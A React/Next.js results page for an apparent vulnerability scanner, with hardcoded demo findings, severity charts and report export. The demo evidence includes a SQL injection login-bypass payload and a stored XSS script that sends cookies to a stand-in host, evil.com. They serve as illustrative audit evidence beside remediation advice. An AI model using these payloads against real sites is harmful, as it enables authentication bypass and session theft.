"use client";

import { useState } from "react";
import { useParams } from "next/navigation";
import Link from "next/link";
import {
  ArrowLeft,
  CheckCircle2,
  XCircle,
  Loader2,
  Download,
  ChevronDown,
  ChevronRight,
  ExternalLink,
} from "lucide-react";
import SeverityBarChart from "@/components/SeverityBarChart";
import { severityBadgeClass, severityColor } from "@/lib/api";
import type { Finding } from "@/lib/api";

// Demo data for scan results
const demoScan = {
  id: "scan-001",
  target: "https://app.example.com",
  status: "complete" as const,
  mode: "audit",
  started_at: "2026-03-31T10:00:00Z",
  completed_at: "2026-03-31T10:42:00Z",
  findings: [
    {
      id: "f-1",
      title: "SQL Injection in Login Endpoint",
      severity: "critical" as const,
      description:
        "The /api/auth/login endpoint is vulnerable to SQL injection through the username parameter. An attacker can bypass authentication or extract database contents.",
      evidence:
        "Parameter: username\nPayload: admin' OR '1'='1' --\nResponse: 200 OK with admin session token",
      recommendation:
        "Use parameterized queries or prepared statements. Never concatenate user input directly into SQL queries.",
      cwe: "CWE-89",
      agent: "SQLi-Hunter-Alpha",
      division: "Injection",
    },
    {
      id: "f-2",
      title: "Stored XSS in User Profile",
      severity: "high" as const,
      description:
        "The bio field in user profiles allows script injection that executes when other users view the profile page.",
      evidence:
        'Input: <script>document.location="https://evil.com/?c="+document.cookie</script>\nResult: Script executed in victim browser context',
      recommendation:
        "Implement output encoding for all user-generated content. Use Content-Security-Policy headers.",
      cwe: "CWE-79",
      agent: "XSS-Probe-Beta",
      division: "XSS",
    },
    {
      id: "f-3",
      title: "Missing Rate Limiting on API",
      severity: "medium" as const,
      description:
        "The /api/v2/ endpoints lack rate limiting, allowing unlimited requests that could lead to denial of service or brute force attacks.",
      evidence:
        "Sent 10,000 requests in 60 seconds with no throttling detected.",
      recommendation:
        "Implement rate limiting using token bucket or sliding window algorithm. Return 429 status codes when limits are exceeded.",
      cwe: "CWE-770",
      agent: "RateLimit-Scanner",
      division: "Rate Limiting",
    },
    {
      id: "f-4",
      title: "Insecure Direct Object Reference",
      severity: "high" as const,
      description:
        "User documents can be accessed by modifying the document ID parameter without proper authorization checks.",
      evidence:
        "GET /api/documents/1234 returns document belonging to another user.",
      recommendation:
        "Implement proper authorization checks that verify the requesting user owns or has access to the requested resource.",
      cwe: "CWE-639",
      agent: "AuthZ-Checker-Gamma",
      division: "Authorization",
    },
    {
      id: "f-5",
      title: "Server Version Disclosure",
      severity: "low" as const,
      description:
        "Server response headers reveal the web server version and technology stack.",
      evidence:
        'Header: Server: nginx/1.24.0\nHeader: X-Powered-By: Express 4.18.2',
      recommendation:
        "Remove or obfuscate server version headers. Configure web server to suppress version information.",
      cwe: "CWE-200",
      agent: "InfoDisc-Scanner",
      division: "Information Disclosure",
    },
    {
      id: "f-6",
      title: "Cookie Missing Secure Flag",
      severity: "medium" as const,
      description:
        "Session cookies are set without the Secure flag, allowing transmission over unencrypted HTTP connections.",
      evidence:
        "Set-Cookie: session=abc123; Path=/; HttpOnly (missing Secure flag)",
      recommendation:
        "Add the Secure flag to all session cookies to ensure they are only sent over HTTPS connections.",
      cwe: "CWE-614",
      agent: "Session-Auditor",
      division: "Session Management",
    },
    {
      id: "f-7",
      title: "TLS 1.0 Supported",
      severity: "info" as const,
      description:
        "The server supports TLS 1.0 which is deprecated and has known vulnerabilities.",
      evidence: "TLS handshake succeeded with TLS 1.0 protocol.",
      recommendation:
        "Disable TLS 1.0 and 1.1. Only support TLS 1.2 and TLS 1.3.",
      cwe: "CWE-326",
      agent: "Crypto-Auditor",
      division: "Cryptography",
    },
  ] as Finding[],
  summary: {
    total_findings: 7,
    critical: 1,
    high: 2,
    medium: 2,
    low: 1,
    info: 1,
    duration_seconds: 2520,
  },
};

const severityOrder = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };

function StatusIcon({ status }: { status: string }) {
  switch (status) {
    case "complete":
      return <CheckCircle2 className="h-5 w-5 text-green-400" />;
    case "failed":
      return <XCircle className="h-5 w-5 text-red-400" />;
    case "running":
      return <Loader2 className="h-5 w-5 text-blue-400 animate-spin" />;
    default:
      return null;
  }
}

function FindingCard({
  finding,
  isOpen,
  onToggle,
}: {
  finding: Finding;
  isOpen: boolean;
  onToggle: () => void;
}) {
  return (
    <div className="border border-zinc-700 rounded-lg overflow-hidden">
      <button
        onClick={onToggle}
        className="w-full flex items-center gap-3 px-4 py-3 hover:bg-zinc-800/50 transition-colors text-left"
      >
        {isOpen ? (
          <ChevronDown className="h-4 w-4 text-zinc-500 flex-shrink-0" />
        ) : (
          <ChevronRight className="h-4 w-4 text-zinc-500 flex-shrink-0" />
        )}
        <span
          className={`inline-flex items-center px-2 py-0.5 rounded text-xs font-medium border ${severityBadgeClass(finding.severity)}`}
        >
          {finding.severity.toUpperCase()}
        </span>
        <span className="text-sm text-zinc-200 flex-1">{finding.title}</span>
        {finding.cwe && (
          <span className="text-xs text-zinc-500 font-mono hidden sm:inline">
            {finding.cwe}
          </span>
        )}
      </button>

      {isOpen && (
        <div className="px-4 pb-4 pt-1 border-t border-zinc-800 space-y-4">
          <div>
            <h4 className="text-xs font-medium text-zinc-500 uppercase tracking-wider mb-1">
              Description
            </h4>
            <p className="text-sm text-zinc-300">{finding.description}</p>
          </div>

          {finding.evidence && (
            <div>
              <h4 className="text-xs font-medium text-zinc-500 uppercase tracking-wider mb-1">
                Evidence
              </h4>
              <pre className="text-xs text-zinc-400 bg-zinc-900 border border-zinc-800 rounded-lg p-3 overflow-x-auto font-mono whitespace-pre-wrap">
                {finding.evidence}
              </pre>
            </div>
          )}

          {finding.recommendation && (
            <div>
              <h4 className="text-xs font-medium text-zinc-500 uppercase tracking-wider mb-1">
                Recommendation
              </h4>
              <p className="text-sm text-zinc-300">{finding.recommendation}</p>
            </div>
          )}

          <div className="flex flex-wrap gap-4 pt-2">
            {finding.cwe && (
              <a
                href={`https://cwe.mitre.org/data/definitions/${finding.cwe.replace("CWE-", "")}.html`}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-1 text-xs text-accent hover:text-accent-hover"
              >
                {finding.cwe} <ExternalLink className="h-3 w-3" />
              </a>
            )}
            {finding.agent && (
              <span className="text-xs text-zinc-500">
                Agent: {finding.agent}
              </span>
            )}
            {finding.division && (
              <span className="text-xs text-zinc-500">
                Division: {finding.division}
              </span>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

export default function ScanResultsPage() {
  const params = useParams();
  const scanId = params.id as string;
  const scan = { ...demoScan, id: scanId };

  const [expandedFindings, setExpandedFindings] = useState<Set<string>>(
    new Set()
  );

  function toggleFinding(id: string) {
    setExpandedFindings((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  }

  function expandAll() {
    setExpandedFindings(new Set(scan.findings.map((f) => f.id)));
  }

  function collapseAll() {
    setExpandedFindings(new Set());
  }

  const sortedFindings = [...scan.findings].sort(
    (a, b) =>
      (severityOrder[a.severity] ?? 5) - (severityOrder[b.severity] ?? 5)
  );

  const chartData = [
    { name: "Critical", count: scan.summary.critical, color: severityColor("critical") },
    { name: "High", count: scan.summary.high, color: severityColor("high") },
    { name: "Medium", count: scan.summary.medium, color: severityColor("medium") },
    { name: "Low", count: scan.summary.low, color: severityColor("low") },
    { name: "Info", count: scan.summary.info, color: severityColor("info") },
  ];

  function exportData(format: string) {
    const content =
      format === "json"
        ? JSON.stringify(scan, null, 2)
        : format === "sarif"
          ? JSON.stringify(
              {
                $schema:
                  "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
                version: "2.1.0",
                runs: [
                  {
                    tool: { driver: { name: "SecProbe", version: "1.0.0" } },
                    results: scan.findings.map((f) => ({
                      ruleId: f.cwe || f.id,
                      message: { text: f.description },
                      level:
                        f.severity === "critical" || f.severity === "high"
                          ? "error"
                          : f.severity === "medium"
                            ? "warning"
                            : "note",
                    })),
                  },
                ],
              },
              null,
              2
            )
          : `<html><head><title>SecProbe Report - ${scan.target}</title></head><body><h1>Scan Report</h1><p>Target: ${scan.target}</p><p>Findings: ${scan.summary.total_findings}</p></body></html>`;

    const blob = new Blob([content], { type: "application/octet-stream" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `secprobe-${scan.id}.${format === "sarif" ? "sarif.json" : format}`;
    a.click();
    URL.revokeObjectURL(url);
  }

  const duration = scan.summary.duration_seconds;
  const durationStr = `${Math.floor(duration / 60)}m ${duration % 60}s`;

  return (
    <div className="max-w-5xl mx-auto space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center gap-4">
        <Link
          href="/"
          className="flex items-center gap-2 text-sm text-zinc-500 hover:text-zinc-300 transition-colors"
        >
          <ArrowLeft className="h-4 w-4" />
          Back to Dashboard
        </Link>
      </div>

      {/* Scan Status */}
      <div className="card">
        <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
          <div className="flex items-center gap-3">
            <StatusIcon status={scan.status} />
            <div>
              <h1 className="text-xl font-bold text-zinc-100">
                Scan {scan.id}
              </h1>
              <p className="text-sm text-zinc-400 font-mono">{scan.target}</p>
            </div>
          </div>
          <div className="flex flex-wrap gap-2">
            <span className="inline-flex items-center px-2.5 py-1 rounded-lg bg-zinc-800 border border-zinc-700 text-xs text-zinc-300">
              Mode: {scan.mode}
            </span>
            <span className="inline-flex items-center px-2.5 py-1 rounded-lg bg-zinc-800 border border-zinc-700 text-xs text-zinc-300">
              Duration: {durationStr}
            </span>
            <span className="inline-flex items-center px-2.5 py-1 rounded-lg bg-zinc-800 border border-zinc-700 text-xs text-zinc-300">
              {scan.summary.total_findings} findings
            </span>
          </div>
        </div>
      </div>

      {/* Severity Chart + Summary */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <div className="card">
          <h2 className="text-lg font-semibold text-zinc-100 mb-4">
            Severity Distribution
          </h2>
          <SeverityBarChart data={chartData} />
        </div>
        <div className="card space-y-4">
          <h2 className="text-lg font-semibold text-zinc-100">Summary</h2>
          <div className="grid grid-cols-2 gap-3">
            {chartData.map((item) => (
              <div
                key={item.name}
                className="flex items-center justify-between p-3 rounded-lg bg-zinc-800/50 border border-zinc-700"
              >
                <div className="flex items-center gap-2">
                  <span
                    className="h-3 w-3 rounded-full"
                    style={{ backgroundColor: item.color }}
                  />
                  <span className="text-sm text-zinc-400">{item.name}</span>
                </div>
                <span className="text-lg font-bold text-zinc-100">
                  {item.count}
                </span>
              </div>
            ))}
          </div>
          {/* Export */}
          <div className="pt-2">
            <p className="text-xs text-zinc-500 mb-2">Export Report</p>
            <div className="flex gap-2">
              <button
                onClick={() => exportData("json")}
                className="btn-secondary text-xs flex items-center gap-1"
              >
                <Download className="h-3 w-3" /> JSON
              </button>
              <button
                onClick={() => exportData("html")}
                className="btn-secondary text-xs flex items-center gap-1"
              >
                <Download className="h-3 w-3" /> HTML
              </button>
              <button
                onClick={() => exportData("sarif")}
                className="btn-secondary text-xs flex items-center gap-1"
              >
                <Download className="h-3 w-3" /> SARIF
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Findings List */}
      <div className="card">
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-lg font-semibold text-zinc-100">Findings</h2>
          <div className="flex gap-2">
            <button
              onClick={expandAll}
              className="text-xs text-accent hover:text-accent-hover"
            >
              Expand all
            </button>
            <span className="text-zinc-600">|</span>
            <button
              onClick={collapseAll}
              className="text-xs text-zinc-500 hover:text-zinc-300"
            >
              Collapse all
            </button>
          </div>
        </div>
        <div className="space-y-2">
          {sortedFindings.map((finding) => (
            <FindingCard
              key={finding.id}
              finding={finding}
              isOpen={expandedFindings.has(finding.id)}
              onToggle={() => toggleFinding(finding.id)}
            />
          ))}
        </div>
      </div>
    </div>
  );
}
